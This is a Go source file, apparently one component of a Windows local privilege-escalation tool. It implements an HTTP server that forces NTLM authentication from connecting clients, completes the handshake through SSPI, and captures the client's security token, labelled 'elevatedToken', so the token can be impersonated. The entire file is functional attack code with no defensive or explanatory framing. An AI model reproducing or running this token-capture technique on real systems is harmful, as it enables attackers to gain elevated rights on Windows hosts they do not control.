package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/alexbrainman/sspi/ntlm"
	"golang.org/x/sys/windows"
)

type HTTPNTLMNegotiator struct {
	Host          string
	Port          int
	Context       *ntlm.ServerContext
	Chan          chan NegotiatorResult
	Authenticated bool
}

func (negotiator HTTPNTLMNegotiator) Serve() NegotiatorResult {

	go func() {
		err := http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)
		if err != nil {
			fmt.Println("[!] Failed to start HTTP server. Double check your arguments.")
			os.Exit(-1)
		}
	}()

	fmt.Println("[+] Started HTTP NTLM negotiator at " + negotiator.Host + ":" + strconv.Itoa(negotiator.Port))
	result := <-negotiator.Chan

	return result
}

func (negotiator HTTPNTLMNegotiator) Trigger() bool {
	return true
}

func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
	ntlmHash := req.Header.Get("Authorization")

	if len(ntlmHash) == 0 && !negotiator.Authenticated {
		negotiator.Context.Release()
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
	} else if !negotiator.Authenticated {
		bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
		ntlmLoc := ParseNTLM(bytes)
		ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]

		if err != nil {
			fmt.Println("[!] Client sent illegal NTLM")
			return
		}

		messageType := bytes[ntlmLoc+8]
		switch messageType {
		case 1:
			creds, err := ntlm.AcquireServerCredentials()

			if err != nil {
				fmt.Println("[!] Couldn't allocate server credentials")
				return
			}

			context, challenge, err := ntlm.NewServerContext(creds, ntlmBytes)
			challenge = []byte(base64.StdEncoding.EncodeToString(challenge))
			negotiator.Context = context

			if err != nil {
				fmt.Println("[!] Could not create new server context ", err)
				return
			}

			res.Header().Set("WWW-Authenticate", "NTLM "+string(challenge))
			res.WriteHeader(http.StatusUnauthorized)
			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash + "\n[+] Sending challenge " + string(challenge))
		case 3:
			err = negotiator.Context.Update(ntlmBytes)

			if err != nil {
				fmt.Println("[!] Couldn't complete NTLM authentication ", err)
				return
			}

			res.Header().Set("WWW-Authenticate", "NTLM")
			res.WriteHeader(http.StatusOK)
			fmt.Println("[+] " + req.RemoteAddr + " authenticated")

			var elevatedToken windows.Token
			_, _, err = querySecurityContextToken.Call(uintptr(unsafe.Pointer(&negotiator.Context.Context().Handle.Lower)), uintptr(unsafe.Pointer(&elevatedToken)))

			if err != syscall.Errno(0) {
				fmt.Println("[!] Failed to query security context token")
				negotiator.Chan <- NegotiatorResult{nil, err}
				return
			}
			negotiator.Authenticated = true
			negotiator.Chan <- NegotiatorResult{&elevatedToken, nil}
		}
	} else {
		res.WriteHeader(http.StatusNotFound)
	}
}

func ParseNTLM(bytes []byte) int {
	pattern := [7]byte{0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50}
	pIdx := 0

	for i, v := range bytes {
		if v == pattern[pIdx] {
			pIdx++
			if pIdx == 7 {
				return i - 6
			}
		} else {
			pIdx = 0
		}
	}

	return -1
}
